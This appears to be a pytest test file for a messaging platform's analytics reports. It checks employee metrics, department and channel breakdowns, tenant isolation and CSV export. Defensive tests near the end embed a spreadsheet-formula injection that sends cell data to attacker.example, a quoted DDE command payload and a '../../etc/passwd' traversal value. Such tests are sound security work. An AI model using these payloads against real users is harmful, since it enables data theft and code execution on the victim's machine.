"""The reports an owner runs the business on.

Per-employee performance, per-department and per-channel breakdowns, the spread
of a customer's wait, and the CSV that takes those numbers out of the platform.

Every figure here is checked against data whose right answer is known by
construction, because a report is believed. The two properties that matter most
are the ones this platform has already got wrong once:

* a figure counted from an event name nobody writes, which reads a confident
  zero forever (`test_every_counted_event_name_is_one_the_code_writes`);
* one company's numbers reaching another's report.
"""

from __future__ import annotations

import csv
import io
import sys
from datetime import datetime, timedelta, timezone

import pytest


PASSWORD = "OwnerPass123!"


# ----------------------------------------------------------------------
# Fixtures
# ----------------------------------------------------------------------


@pytest.fixture()
def service(platform, monkeypatch):
    """Point the analytics service at the test platform's databases."""
    import backend.services.analytics_service  # noqa: F401
    import database.manager as manager_module

    original = manager_module.database_manager
    test_manager = platform["manager"]

    monkeypatch.setattr(manager_module, "database_manager", test_manager)

    for module in list(sys.modules.values()):
        if getattr(module, "database_manager", None) is original:
            monkeypatch.setattr(module, "database_manager", test_manager)

    from backend.services.analytics_service import analytics_service

    return analytics_service


@pytest.fixture()
def app_client(platform, monkeypatch):
    from database.manager import DatabaseManager
    import database.manager as manager_module
    from backend.api.routes import analytics, auth

    test_manager = platform["manager"]
    monkeypatch.setattr(manager_module, "database_manager", test_manager)
    for module in list(sys.modules.values()):
        held = getattr(module, "database_manager", None)
        if isinstance(held, DatabaseManager) and held is not test_manager:
            monkeypatch.setattr(module, "database_manager", test_manager)

    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    app = FastAPI()
    app.include_router(auth.router)
    app.include_router(analytics.router)
    return TestClient(app, raise_server_exceptions=False)


def _sign_in(platform, company, app_client, email, full_name):
    """An owner of `company`, signed in, with their user id."""
    from backend.services.auth_service import auth_service
    from database.manager import utc_now_iso

    user_id = auth_service.create_user(
        email=email, password=PASSWORD, full_name=full_name
    )

    with platform["manager"].control() as conn:
        role = conn.execute(
            "SELECT id FROM roles WHERE company_id = ? AND code = 'owner'",
            (company["id"],),
        ).fetchone()
        conn.execute(
            "INSERT INTO company_users (company_id, user_id, role_id, status, created_at)"
            " VALUES (?, ?, ?, 'active', ?)",
            (company["id"], user_id, int(role["id"]), utc_now_iso()),
        )
        conn.commit()

    response = app_client.post(
        "/api/auth/login",
        json={
            "workspace_code": company["workspace_code"],
            "company": company["name"],
            "email": email,
            "password": PASSWORD,
        },
    )
    assert response.status_code == 200, response.text
    body = response.json()

    return {
        "id": user_id,
        "headers": {
            "Authorization": f"Bearer {body['access_token']}",
            "X-CSRF-Token": body.get("csrf_token", ""),
        },
    }


@pytest.fixture()
def owner(platform, alpha, app_client):
    return _sign_in(platform, alpha, app_client, "rana@alpha.example.com", "Rana Haddad")


# ----------------------------------------------------------------------
# Seeding helpers
# ----------------------------------------------------------------------


def _iso(minutes_ago: float) -> str:
    return (
        datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)
    ).isoformat()


def _conversation(platform, company, conversation_id, *, channel="messenger", **columns):
    manager = platform["manager"]
    now = datetime.now(timezone.utc).isoformat()

    extra = ", ".join(f"{name} = ?" for name in columns)

    with manager.tenant(company["id"]) as conn:
        conn.execute(
            """
            INSERT OR IGNORE INTO conversations (
                id, company_id, channel, external_user_id, created_at, updated_at
            )
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            (conversation_id, company["id"], channel, f"cust-{conversation_id}", now, now),
        )

        if columns:
            conn.execute(
                f"UPDATE conversations SET {extra} WHERE id = ?",
                (*columns.values(), conversation_id),
            )

        conn.commit()


def _messages(platform, company, conversation_id, rows, *, channel="messenger"):
    """`rows` is (direction, sender_type, sender_user_id, minutes_ago)."""
    manager = platform["manager"]

    with manager.tenant(company["id"]) as conn:
        for direction, sender_type, sender_user_id, minutes_ago in rows:
            conn.execute(
                """
                INSERT INTO messages (
                    company_id, conversation_id, channel, external_user_id,
                    direction, sender_type, sender_user_id, body, created_at
                )
                VALUES (?, ?, ?, ?, ?, ?, ?, 'x', ?)
                """,
                (
                    company["id"],
                    conversation_id,
                    channel,
                    f"cust-{conversation_id}",
                    direction,
                    sender_type,
                    sender_user_id,
                    _iso(minutes_ago),
                ),
            )
        conn.commit()


def _department(platform, company, code, name_en):
    manager = platform["manager"]
    now = datetime.now(timezone.utc).isoformat()

    with manager.tenant(company["id"]) as conn:
        conn.execute(
            """
            INSERT OR IGNORE INTO business_departments (
                company_id, code, name_en, created_at, updated_at
            )
            VALUES (?, ?, ?, ?, ?)
            """,
            (company["id"], code, name_en, now, now),
        )
        conn.commit()


# ----------------------------------------------------------------------
# Per-employee performance
# ----------------------------------------------------------------------


def test_employee_performance_counts_conversations_not_just_replies(
    service, platform, alpha
):
    """Ten replies to one customer and ten replies to ten customers are not the
    same day's work, and a reply count alone cannot tell them apart."""
    _conversation(platform, alpha, 1)
    _conversation(platform, alpha, 2)

    _messages(
        platform,
        alpha,
        1,
        [("out", "employee", 7, 30), ("out", "employee", 7, 25)],
    )
    _messages(platform, alpha, 2, [("out", "employee", 7, 20)])

    rows = service.employee_performance(company_id=alpha["id"], days=30)

    assert len(rows) == 1
    assert rows[0]["user_id"] == 7
    assert rows[0]["replies"] == 3
    assert rows[0]["conversations"] == 2


def test_employee_response_time_measures_the_wait_it_ended(service, platform, alpha):
    """The gap from the customer's message to the reply that answered it."""
    _conversation(platform, alpha, 1)
    _messages(
        platform,
        alpha,
        1,
        [
            ("in", "customer", None, 40),
            ("out", "employee", 7, 30),  # ten minutes later
            ("in", "customer", None, 20),
            ("out", "employee", 7, 0),  # twenty minutes later
        ],
    )

    rows = service.employee_performance(company_id=alpha["id"], days=30)

    assert rows[0]["answered"] == 2
    assert rows[0]["average_response_seconds"] == pytest.approx(900, abs=5)
    assert rows[0]["slowest_response_seconds"] == pytest.approx(1200, abs=5)


def test_a_burst_of_replies_does_not_flatter_the_response_time(
    service, platform, alpha
):
    """Only a reply that followed a customer message is timed.

    An employee who answers in three short lines has answered once. Timing all
    three would record two near-instant replies that no customer ever waited
    for, and would halve the reported average — the report flattering the team
    precisely where it should not.
    """
    _conversation(platform, alpha, 1)
    _messages(
        platform,
        alpha,
        1,
        [
            ("in", "customer", None, 40),
            ("out", "employee", 7, 30),
            ("out", "employee", 7, 29),
            ("out", "employee", 7, 28),
        ],
    )

    rows = service.employee_performance(company_id=alpha["id"], days=30)

    assert rows[0]["replies"] == 3
    assert rows[0]["answered"] == 1
    assert rows[0]["average_response_seconds"] == pytest.approx(600, abs=5)


def test_an_employee_with_no_answered_wait_reports_no_time_not_zero(
    service, platform, alpha
):
    """A missing measurement is `null`. Zero would read as "answered instantly",
    which is the opposite of "never measured"."""
    _conversation(platform, alpha, 1)
    _messages(platform, alpha, 1, [("out", "employee", 7, 30)])

    rows = service.employee_performance(company_id=alpha["id"], days=30)

    assert rows[0]["replies"] == 1
    assert rows[0]["answered"] == 0
    assert rows[0]["average_response_seconds"] is None


def test_employee_performance_never_crosses_companies(service, platform, alpha, beta):
    """Both companies happen to employ user 7 — an id is only meaningful inside
    the company that issued it, and the two files must not be added together."""
    _conversation(platform, alpha, 1)
    _messages(platform, alpha, 1, [("out", "employee", 7, 10)] * 4)

    _conversation(platform, beta, 1)
    _messages(platform, beta, 1, [("out", "employee", 7, 10)])

    assert service.employee_performance(company_id=alpha["id"], days=30)[0][
        "replies"
    ] == 4
    assert service.employee_performance(company_id=beta["id"], days=30)[0][
        "replies"
    ] == 1


# ----------------------------------------------------------------------
# Per-department
# ----------------------------------------------------------------------


def test_department_breakdown_splits_traffic_by_section(service, platform, alpha):
    _department(platform, alpha, "sales", "Sales")
    _department(platform, alpha, "support", "Support")

    _conversation(platform, alpha, 1, department="sales")
    _conversation(platform, alpha, 2, department="support")

    _messages(
        platform,
        alpha,
        1,
        [("in", "customer", None, 30), ("out", "ai", None, 29)],
    )
    _messages(platform, alpha, 2, [("in", "customer", None, 30)])

    breakdown = {
        row["code"]: row
        for row in service.by_department(company_id=alpha["id"], days=30)
    }

    assert breakdown["sales"]["name"] == "Sales"
    assert breakdown["sales"]["messages"] == 2
    assert breakdown["sales"]["by_assistant"] == 1
    assert breakdown["sales"]["automation_rate"] == 1.0
    assert breakdown["support"]["messages"] == 1
    assert breakdown["support"]["by_assistant"] == 0


def test_an_undefined_department_still_shows_its_traffic(service, platform, alpha):
    """A company that renamed or deleted a section still has conversations
    filed under the old code. Dropping them would silently lose messages from
    the report's totals."""
    _conversation(platform, alpha, 1, department="retired-code")
    _messages(platform, alpha, 1, [("in", "customer", None, 10)])

    breakdown = service.by_department(company_id=alpha["id"], days=30)

    assert len(breakdown) == 1
    assert breakdown[0]["code"] == "retired-code"
    assert breakdown[0]["name"] == "retired-code"
    assert breakdown[0]["defined"] is False
    assert breakdown[0]["messages"] == 1


def test_unrouted_conversations_are_reported_not_dropped(service, platform, alpha):
    """A conversation nobody filed is the one most likely to be neglected, so
    it gets a row of its own rather than vanishing from the breakdown."""
    _conversation(platform, alpha, 1, department="")
    _messages(platform, alpha, 1, [("in", "customer", None, 10)])

    breakdown = service.by_department(company_id=alpha["id"], days=30)

    assert [row["code"] for row in breakdown] == ["Unassigned"]
    assert breakdown[0]["messages"] == 1
    # Not flagged as an unknown section: nobody having routed it yet is the
    # expected state, not a stale code the company has since deleted.
    assert breakdown[0]["defined"] is True


def test_department_totals_never_cross_companies(service, platform, alpha, beta):
    _department(platform, alpha, "sales", "Sales")
    _department(platform, beta, "sales", "Sales")

    _conversation(platform, alpha, 1, department="sales")
    _messages(platform, alpha, 1, [("in", "customer", None, 10)] * 6)

    _conversation(platform, beta, 1, department="sales")
    _messages(platform, beta, 1, [("in", "customer", None, 10)] * 2)

    assert service.by_department(company_id=alpha["id"], days=30)[0]["messages"] == 6
    assert service.by_department(company_id=beta["id"], days=30)[0]["messages"] == 2


# ----------------------------------------------------------------------
# Per-channel over time
# ----------------------------------------------------------------------


def test_channel_trend_reports_a_silent_channel_as_zero(service, platform, alpha):
    """A day where a channel carried nothing has to be a zero, not a gap: a
    missing key makes a stacked chart drop the band, which reads as "no data"
    rather than "nothing happened"."""
    _conversation(platform, alpha, 1, channel="whatsapp")
    _conversation(platform, alpha, 2, channel="telegram")

    _messages(platform, alpha, 1, [("in", "customer", None, 5)], channel="whatsapp")
    _messages(
        platform,
        alpha,
        2,
        [("in", "customer", None, 60 * 24 * 3)],
        channel="telegram",
    )

    trend = service.channel_trend(company_id=alpha["id"], days=30)

    assert sorted(trend["channels"]) == ["telegram", "whatsapp"]
    assert len(trend["days"]) == 2

    for day in trend["days"]:
        assert set(day) == {"day", "telegram", "whatsapp"}
        assert day["telegram"] + day["whatsapp"] == 1


def test_channel_trend_never_crosses_companies(service, platform, alpha, beta):
    _conversation(platform, alpha, 1, channel="whatsapp")
    _messages(platform, alpha, 1, [("in", "customer", None, 5)] * 3, channel="whatsapp")

    _conversation(platform, beta, 1, channel="telegram")
    _messages(platform, beta, 1, [("in", "customer", None, 5)], channel="telegram")

    assert service.channel_trend(company_id=alpha["id"], days=30)["channels"] == [
        "whatsapp"
    ]
    assert service.channel_trend(company_id=beta["id"], days=30)["channels"] == [
        "telegram"
    ]


# ----------------------------------------------------------------------
# The spread of a customer's wait
# ----------------------------------------------------------------------


def test_the_distribution_shows_the_customer_the_average_hides(
    service, platform, alpha
):
    """Nine fast replies and one two-hour wait average to twelve minutes, which
    is the number that lets a business tell itself it is doing fine. The bands
    and the tail percentile are what make the tenth customer visible."""
    for conversation_id in range(1, 10):
        _conversation(platform, alpha, conversation_id)
        _messages(
            platform,
            alpha,
            conversation_id,
            [("in", "customer", None, 200), ("out", "ai", None, 199.5)],
        )

    _conversation(platform, alpha, 10)
    _messages(
        platform,
        alpha,
        10,
        [("in", "customer", None, 200), ("out", "employee", 7, 80)],
    )

    result = service.first_response_times(company_id=alpha["id"], days=30)

    assert result["answered"] == 10

    buckets = {row["label"]: row["conversations"] for row in result["buckets"]}
    assert buckets["under 1 min"] == 9
    assert buckets["1-4 hours"] == 1

    assert result["percentiles"]["p50"] < 60
    assert result["percentiles"]["p95"] > 3600

    assert result["slowest"][0]["conversation_id"] == 10
    assert result["slowest"][0]["waited_seconds"] == pytest.approx(7200, abs=60)


def test_the_buckets_are_all_present_even_when_empty(service, platform, alpha):
    """The chart keeps a stable axis instead of collapsing to whichever bands
    happen to have data."""
    _conversation(platform, alpha, 1)
    _messages(
        platform,
        alpha,
        1,
        [("in", "customer", None, 30), ("out", "ai", None, 29)],
    )

    labels = [
        row["label"]
        for row in service.first_response_times(company_id=alpha["id"], days=30)[
            "buckets"
        ]
    ]

    assert labels == [
        "under 1 min",
        "1-5 min",
        "5-15 min",
        "15-60 min",
        "1-4 hours",
        "over 4 hours",
    ]


def test_a_customer_who_was_never_answered_is_named(service, platform, alpha):
    """The single most actionable row in the whole report: someone wrote in and
    nobody has ever replied. It must be nameable, not merely counted."""
    _conversation(platform, alpha, 1, customer_alias="Lina Khoury")
    _messages(platform, alpha, 1, [("in", "customer", None, 300)])

    result = service.first_response_times(company_id=alpha["id"], days=30)

    assert result["unanswered"] == 1
    assert result["never_answered"][0]["customer"] == "Lina Khoury"
    assert result["never_answered"][0]["conversation_id"] == 1


def test_an_empty_period_reports_no_distribution_rather_than_zeros(service, alpha):
    """No data is `null`, never 0.0 — a company with nothing to report must not
    be told its response time is instant."""
    result = service.first_response_times(company_id=alpha["id"], days=30)

    assert result["average_seconds"] is None
    assert result["percentiles"] == {"p50": None, "p75": None, "p90": None, "p95": None}
    assert result["slowest"] == []
    assert all(row["conversations"] == 0 for row in result["buckets"])


# ----------------------------------------------------------------------
# The whole report, and the names on it
# ----------------------------------------------------------------------


def test_the_report_answers_with_every_section(app_client, owner, platform, alpha):
    _department(platform, alpha, "sales", "Sales")
    _conversation(platform, alpha, 1, department="sales")
    _messages(
        platform,
        alpha,
        1,
        [("in", "customer", None, 30), ("out", "employee", owner["id"], 20)],
    )

    response = app_client.get("/api/analytics/summary", headers=owner["headers"])

    assert response.status_code == 200, response.text
    body = response.json()

    for section in (
        "overview",
        "volume_by_day",
        "by_channel",
        "channel_trend",
        "by_department",
        "hourly_distribution",
        "assistant",
        "employees",
        "first_response",
    ):
        assert section in body, section

    assert body["by_department"][0]["name"] == "Sales"
    assert body["employees"][0]["name"] == "Rana Haddad"


def test_the_report_resolves_names_without_joining_the_control_database(
    app_client, owner, platform, alpha
):
    """A tenant file cannot join onto `users` — it is a different database, and
    trying has broken this platform before. Names come from one batched
    control-plane lookup, and an id that resolves to nobody still renders."""
    _conversation(platform, alpha, 1)
    _messages(
        platform,
        alpha,
        1,
        [
            ("out", "employee", owner["id"], 20),
            ("out", "employee", 999_999, 10),
        ],
    )

    body = app_client.get(
        "/api/analytics/summary", headers=owner["headers"]
    ).json()

    names = {row["user_id"]: row["name"] for row in body["employees"]}

    assert names[owner["id"]] == "Rana Haddad"
    assert names[999_999] == "User 999999"


def test_the_report_is_refused_without_a_session(app_client):
    response = app_client.get("/api/analytics/summary")
    assert response.status_code in (401, 403)


def test_one_companys_report_never_counts_anothers_messages(
    app_client, owner, platform, alpha, beta
):
    """The whole reporting path end to end, not just the service: the company
    reported on comes from the session, and there is no parameter that could
    point it at another file."""
    _conversation(platform, alpha, 1)
    _messages(platform, alpha, 1, [("in", "customer", None, 10)] * 3)

    _conversation(platform, beta, 1)
    _messages(platform, beta, 1, [("in", "customer", None, 10)] * 40)

    body = app_client.get(
        "/api/analytics/summary", headers=owner["headers"]
    ).json()

    assert body["overview"]["messages"]["total"] == 3

    # And it stays 3 when the caller asks for the other company by every name
    # the route could plausibly read one under.
    for parameters in ({"company_id": beta["id"]}, {"company": beta["name"]}):
        leaked = app_client.get(
            "/api/analytics/summary", params=parameters, headers=owner["headers"]
        ).json()
        assert leaked["overview"]["messages"]["total"] == 3


# ----------------------------------------------------------------------
# Counted events must be events somebody writes
# ----------------------------------------------------------------------


def test_every_counted_event_name_is_one_the_code_writes():
    """A report that counts an event nobody emits shows a confident zero, which
    is worse than showing nothing: nobody questions it.

    This platform shipped exactly that — `analytics_service` counted
    `human_took_over` and `assigned_user_changed` while the writers wrote
    `human_takeover` and `assignment_changed`, so the takeover column read zero
    for every company from the day it shipped. This asserts every literal event
    name the reporting service counts is one some other module actually writes.
    """
    import inspect
    import re
    from pathlib import Path

    import backend.services.analytics_service as analytics_module
    from backend.services.conversation_control_service import (
        EVENT_ASSIGNMENT_CHANGED,
        EVENT_HUMAN_TAKEOVER,
    )

    source = inspect.getsource(analytics_module)

    # Event names the report reads out of the diagnostics and timeline tables.
    # The two conversation events arrive as imported constants, so they are
    # resolved rather than scraped.
    counted = set(
        re.findall(r'events\.get\(\s*\n?\s*"([a-z0-9_]+)"', source)
    ) | {EVENT_HUMAN_TAKEOVER, EVENT_ASSIGNMENT_CHANGED}

    assert counted, "the sweep found no counted event names to check"

    root = Path(analytics_module.__file__).resolve().parents[3]
    writers = ""
    for path in sorted(root.rglob("*.py")):
        parts = set(path.parts)
        if "tests" in parts or ".git" in parts or "node_modules" in parts:
            continue
        if path.name == "analytics_service.py":
            continue
        writers += path.read_text(encoding="utf-8", errors="ignore")

    unwritten = sorted(
        name
        for name in counted
        if f'event_type="{name}"' not in writers
        and f"event_type='{name}'" not in writers
        and f'"{name}"' not in writers
    )

    assert not unwritten, (
        "the report counts event names nothing writes, so they can only ever "
        f"read zero: {unwritten}"
    )


# ----------------------------------------------------------------------
# CSV export
# ----------------------------------------------------------------------


def _read_csv(response):
    return list(csv.DictReader(io.StringIO(response.text)))


def test_the_employee_report_exports_as_csv(app_client, owner, platform, alpha):
    _conversation(platform, alpha, 1)
    _messages(
        platform,
        alpha,
        1,
        [("in", "customer", None, 30), ("out", "employee", owner["id"], 20)],
    )

    response = app_client.get(
        "/api/analytics/export",
        params={"report": "employees", "days": 30},
        headers=owner["headers"],
    )

    assert response.status_code == 200, response.text
    assert response.headers["content-type"].startswith("text/csv")
    assert "attachment; filename=" in response.headers["content-disposition"]
    assert ".csv" in response.headers["content-disposition"]

    rows = _read_csv(response)

    assert len(rows) == 1
    assert rows[0]["employee"] == "Rana Haddad"
    assert rows[0]["replies_sent"] == "1"
    assert rows[0]["conversations_handled"] == "1"
    assert float(rows[0]["average_response_seconds"]) == pytest.approx(600, abs=10)


def test_every_report_exports(app_client, owner, platform, alpha):
    """Each name the export offers has to produce a file, not a 500."""
    _department(platform, alpha, "sales", "Sales")
    _conversation(platform, alpha, 1, department="sales")
    _messages(
        platform,
        alpha,
        1,
        [("in", "customer", None, 30), ("out", "employee", owner["id"], 20)],
    )

    for name in ("employees", "departments", "channels", "volume", "response"):
        response = app_client.get(
            "/api/analytics/export",
            params={"report": name},
            headers=owner["headers"],
        )

        assert response.status_code == 200, f"{name}: {response.text}"
        assert _read_csv(response), f"{name} exported an empty file"


def test_an_export_of_an_empty_period_is_an_empty_file_not_an_error(
    app_client, owner
):
    response = app_client.get(
        "/api/analytics/export",
        params={"report": "volume"},
        headers=owner["headers"],
    )

    assert response.status_code == 200
    assert response.text == ""


def test_the_export_never_crosses_companies(
    app_client, owner, platform, alpha, beta
):
    """The exported file is the report, so it carries the same guarantee: the
    company comes from the session, and no parameter can move it."""
    _conversation(platform, alpha, 1)
    _messages(platform, alpha, 1, [("in", "customer", None, 10)] * 2)

    _conversation(platform, beta, 1)
    _messages(platform, beta, 1, [("in", "customer", None, 10)] * 30)

    response = app_client.get(
        "/api/analytics/export",
        params={"report": "volume", "company_id": beta["id"]},
        headers=owner["headers"],
    )

    rows = _read_csv(response)

    assert sum(int(row["total"]) for row in rows) == 2


def test_the_export_is_refused_without_a_session(app_client):
    response = app_client.get("/api/analytics/export")
    assert response.status_code in (401, 403)


def test_an_exported_report_cannot_smuggle_a_spreadsheet_formula(
    app_client, owner, platform, alpha
):
    """A customer's own display name reaches a cell in the owner's export.

    A customer who calls themselves `=cmd|'/C calc'!A0` never signs in — they
    send one message, and the cell runs when the owner opens the file. The same
    is true of a department code an employee typed. Both are prefixed so the
    spreadsheet reads them as text.
    """
    attack = '=HYPERLINK("http://attacker.example/?x="&A1,"refund")'

    _conversation(platform, alpha, 1, customer_alias=attack)
    _messages(platform, alpha, 1, [("in", "customer", None, 300)])

    _conversation(platform, alpha, 2, department=attack)
    _messages(platform, alpha, 2, [("in", "customer", None, 10)])

    for name, column in (("response", "label"), ("departments", "department")):
        response = app_client.get(
            "/api/analytics/export",
            params={"report": name},
            headers=owner["headers"],
        )

        cells = [row[column] for row in _read_csv(response)]

        assert attack not in cells, f"{name} exported the formula verbatim"
        assert f"'{attack}" in cells, f"{name} did not neutralise the formula"


def test_an_unknown_report_name_still_returns_a_file(app_client, owner):
    """An export that 422s teaches the owner nothing about which names are
    valid, so an unrecognised one falls back to the default table."""
    response = app_client.get(
        "/api/analytics/export",
        params={"report": "../../etc/passwd"},
        headers=owner["headers"],
    )

    assert response.status_code == 200
    assert "analytics_employees_" in response.headers["content-disposition"]
